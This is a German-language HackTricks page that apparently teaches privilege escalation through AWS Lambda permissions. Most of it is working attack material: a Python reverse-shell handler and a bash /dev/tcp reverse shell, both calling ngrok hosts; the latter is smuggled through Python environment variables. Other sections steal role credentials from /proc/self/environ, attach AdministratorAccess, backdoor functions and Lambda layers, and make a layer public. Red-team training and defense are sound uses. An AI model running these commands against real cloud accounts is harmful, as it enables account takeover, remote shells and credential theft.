# AWS - Lambda Privesc

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## lambda

Mehr Informationen √ºber Lambda in:

{% content-ref url="../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Benutzer mit den Berechtigungen **`iam:PassRole`, `lambda:CreateFunction` und `lambda:InvokeFunction`** k√∂nnen ihre Berechtigungen eskalieren.\
Sie k√∂nnen **eine neue Lambda-Funktion erstellen und ihr eine vorhandene IAM-Rolle zuweisen**, wodurch der Funktion die Berechtigungen zugewiesen werden, die mit dieser Rolle verbunden sind. Der Benutzer kann dann **Code in diese Lambda-Funktion schreiben und hochladen (zum Beispiel mit einer rev shell)**.\
Sobald die Funktion eingerichtet ist, kann der Benutzer **ihre Ausf√ºhrung ausl√∂sen** und die beabsichtigten Aktionen durch das Aufrufen der Lambda-Funktion √ºber die AWS-API durchf√ºhren. Dieser Ansatz erm√∂glicht es dem Benutzer effektiv, Aufgaben indirekt √ºber die Lambda-Funktion auszuf√ºhren, wobei er mit dem Zugriffslevel arbeitet, das der zugeh√∂rigen IAM-Rolle zugewiesen ist.\\

Ein Angreifer k√∂nnte dies ausnutzen, um eine **rev shell zu erhalten und das Token zu stehlen**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Du k√∂nntest auch **die Berechtigungen der Lambda-Rolle** von der Lambda-Funktion selbst ausnutzen.\
Wenn die Lambda-Rolle gen√ºgend Berechtigungen hatte, k√∂nntest du sie verwenden, um dir Admin-Rechte zu gew√§hren:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Es ist auch m√∂glich, die Anmeldeinformationen der Lambda-Rolle zu leaken, ohne eine externe Verbindung zu ben√∂tigen. Dies w√§re n√ºtzlich f√ºr **Netzwerk-isolierte Lambdas**, die f√ºr interne Aufgaben verwendet werden. Wenn unbekannte Sicherheitsgruppen Ihre Reverse-Shells filtern, erm√∂glicht Ihnen dieses St√ºck Code, die Anmeldeinformationen direkt als Ausgabe der Lambda zu leaken.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potenzielle Auswirkungen:** Direkte Privilegieneskalation auf die beliebige Lambda-Dienstrolle, die angegeben ist.

{% hint style="danger" %}
Beachten Sie, dass **`lambda:InvokeAsync`** **nicht** allein die **Ausf√ºhrung von `aws lambda invoke-async`** erm√∂glicht, Sie ben√∂tigen auch `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Wie im vorherigen Szenario k√∂nnen Sie sich **die Berechtigung `lambda:InvokeFunction`** gew√§hren, wenn Sie die Berechtigung **`lambda:AddPermission`** haben.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potenzielle Auswirkungen:** Direkte Privilegieneskalation zum beliebigen Lambda-Dienstrolle, die angegeben ist.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Benutzer mit **`iam:PassRole`, `lambda:CreateFunction` und `lambda:CreateEventSourceMapping`** Berechtigungen (und m√∂glicherweise `dynamodb:PutItem` und `dynamodb:CreateTable`) k√∂nnen indirekt **Privilegien eskalieren**, selbst ohne `lambda:InvokeFunction`.\
Sie k√∂nnen eine **Lambda-Funktion mit b√∂sartigem Code erstellen und ihr eine vorhandene IAM-Rolle zuweisen**.

Anstatt die Lambda direkt aufzurufen, richtet der Benutzer eine vorhandene DynamoDB-Tabelle ein oder nutzt sie, indem er sie √ºber eine Ereignisquellenzuordnung mit der Lambda verkn√ºpft. Diese Einrichtung stellt sicher, dass die Lambda-Funktion **automatisch ausgel√∂st wird, wenn ein neuer Eintrag** in die Tabelle erfolgt, entweder durch die Aktion des Benutzers oder einen anderen Prozess, wodurch die Lambda-Funktion indirekt aufgerufen und der Code mit den Berechtigungen der √ºbergebenen IAM-Rolle ausgef√ºhrt wird.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Wenn DynamoDB bereits in der AWS-Umgebung aktiv ist, **muss der Benutzer nur die Ereignisquellenzuordnung** f√ºr die Lambda-Funktion festlegen. Wenn DynamoDB jedoch nicht verwendet wird, muss der Benutzer **eine neue Tabelle** mit aktiviertem Streaming **erstellen**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Jetzt ist es m√∂glich, **die Lambda-Funktion mit der DynamoDB-Tabelle zu verbinden**, indem **eine Ereignisquellenzuordnung erstellt wird**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Mit der mit dem DynamoDB-Stream verkn√ºpften Lambda-Funktion kann der Angreifer **indirekt die Lambda ausl√∂sen, indem er den DynamoDB-Stream aktiviert**. Dies kann erreicht werden, indem **ein Element** in die DynamoDB-Tabelle eingef√ºgt wird:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potenzielle Auswirkungen:** Direkte Privilegieneskalation auf die angegebene Lambda-Dienstrolle.

### `lambda:AddPermission`

Ein Angreifer mit dieser Berechtigung kann **sich selbst (oder anderen) beliebige Berechtigungen gew√§hren** (dies erzeugt ressourcenbasierte Richtlinien, um den Zugriff auf die Ressource zu gew√§hren):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potenzielle Auswirkungen:** Direkte Privilegieneskalation zum Lambda-Dienstrolle, die verwendet wird, indem Berechtigungen zum √Ñndern des Codes und Ausf√ºhren gew√§hrt werden.

### `lambda:AddLayerVersionPermission`

Ein Angreifer mit dieser Berechtigung kann **sich selbst (oder anderen) die Berechtigung `lambda:GetLayerVersion` gew√§hren**. Er k√∂nnte auf die Schicht zugreifen und nach Schwachstellen oder sensiblen Informationen suchen.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potenzielle Auswirkungen:** Potenzieller Zugriff auf sensible Informationen.

### `lambda:UpdateFunctionCode`

Benutzer, die die Berechtigung **`lambda:UpdateFunctionCode`** besitzen, haben die M√∂glichkeit, **den Code einer bestehenden Lambda-Funktion, die mit einer IAM-Rolle verkn√ºpft ist, zu √§ndern.**\
Der Angreifer kann **den Code der Lambda √§ndern, um die IAM-Anmeldeinformationen zu exfiltrieren.**

Obwohl der Angreifer m√∂glicherweise nicht die direkte F√§higkeit hat, die Funktion auszul√∂sen, ist es wahrscheinlich, dass die Lambda-Funktion, wenn sie bereits vorhanden und betriebsbereit ist, durch bestehende Workflows oder Ereignisse ausgel√∂st wird, wodurch die Ausf√ºhrung des modifizierten Codes indirekt erleichtert wird.

{% code overflow="wrap" %}
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potenzielle Auswirkungen:** Direkte Privilegieneskalation auf die verwendete Lambda-Dienstrolle.

### `lambda:UpdateFunctionConfiguration`

#### RCE √ºber Umgebungsvariablen

Mit diesen Berechtigungen ist es m√∂glich, Umgebungsvariablen hinzuzuf√ºgen, die dazu f√ºhren, dass die Lambda beliebigen Code ausf√ºhrt. Zum Beispiel ist es in Python m√∂glich, die Umgebungsvariablen `PYTHONWARNING` und `BROWSER` auszunutzen, um einen Python-Prozess dazu zu bringen, beliebige Befehle auszuf√ºhren:

{% code overflow="wrap" %}
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
{% endcode %}

F√ºr andere Skriptsprachen gibt es andere Umgebungsvariablen, die Sie verwenden k√∂nnen. F√ºr weitere Informationen √ºberpr√ºfen Sie die Unterabschnitte der Skriptsprachen in:

{% embed url="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse" %}

#### RCE √ºber Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) erm√∂glicht es, **Code** in Ihrer Lambda-Funktion einzuschlie√üen, aber **separat zu speichern**, sodass der Funktionscode klein bleiben kann und **mehrere Funktionen Code teilen k√∂nnen**.

Innerhalb von Lambda k√∂nnen Sie die Pfade √ºberpr√ºfen, von denen Python-Code geladen wird, mit einer Funktion wie der folgenden:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Diese sind die Orte:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Zum Beispiel wird die Bibliothek boto3 von `/var/runtime/boto3` geladen (4. Position).

#### Ausnutzung

Es ist m√∂glich, die Berechtigung `lambda:UpdateFunctionConfiguration` zu missbrauchen, um **eine neue Schicht** zu einer Lambda-Funktion **hinzuzuf√ºgen**. Um beliebigen Code auszuf√ºhren, muss diese Schicht eine **Bibliothek enthalten, die die Lambda importieren wird.** Wenn Sie den Code der Lambda lesen k√∂nnen, k√∂nnten Sie dies leicht finden, beachten Sie auch, dass es m√∂glich sein k√∂nnte, dass die Lambda **bereits eine Schicht verwendet** und Sie die **Schicht herunterladen** und **Ihren Code** dort hinzuf√ºgen k√∂nnten.

Zum Beispiel, nehmen wir an, dass die Lambda die Bibliothek boto3 verwendet, dies wird eine lokale Schicht mit der letzten Version der Bibliothek erstellen:
```bash
pip3 install -t ./lambda_layer boto3
```
Sie k√∂nnen `./lambda_layer/boto3/__init__.py` √∂ffnen und **die Hintert√ºr im globalen Code hinzuf√ºgen** (eine Funktion zum Exfiltrieren von Anmeldeinformationen oder um beispielsweise eine Reverse-Shell zu erhalten).

Dann zippen Sie das `./lambda_layer`-Verzeichnis und **laden die neue Lambda-Schicht** in Ihr eigenes Konto hoch (oder in das des Opfers, aber m√∂glicherweise haben Sie daf√ºr keine Berechtigungen).\
Beachten Sie, dass Sie einen Python-Ordner erstellen und die Bibliotheken dort ablegen m√ºssen, um /opt/python/boto3 zu √ºberschreiben. Au√üerdem muss die Schicht **mit der von der Lambda verwendeten Python-Version kompatibel sein** und wenn Sie sie in Ihr Konto hochladen, muss sie in der **gleichen Region sein:** 

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Jetzt machen Sie die hochgeladene Lambda-Schicht **f√ºr jedes Konto zug√§nglich**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Und f√ºge die Lambda-Schicht zur Opfer-Lambda-Funktion hinzu:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Der n√§chste Schritt w√§re, entweder **die Funktion selbst aufzurufen**, wenn wir k√∂nnen, oder zu warten, bis sie **auf normale Weise aufgerufen wird** ‚Äì was die sicherere Methode ist.

Eine **stealthier Methode, um diese Schwachstelle auszunutzen**, findet sich in:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potenzielle Auswirkungen:** Direkte Privilegieneskalation zur Lambda-Service-Rolle, die verwendet wird.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Vielleicht sind Sie mit diesen Berechtigungen in der Lage, eine Funktion zu erstellen und sie √ºber die URL auszuf√ºhren... aber ich konnte keinen Weg finden, um es zu testen, also lassen Sie es mich wissen, wenn Sie es tun!

### Lambda MitM

Einige Lambdas werden **sensible Informationen von den Benutzern in Parametern empfangen.** Wenn Sie RCE in einem von ihnen erhalten, k√∂nnen Sie die Informationen, die andere Benutzer an sie senden, exfiltrieren, √ºberpr√ºfen Sie es in:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referenzen

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
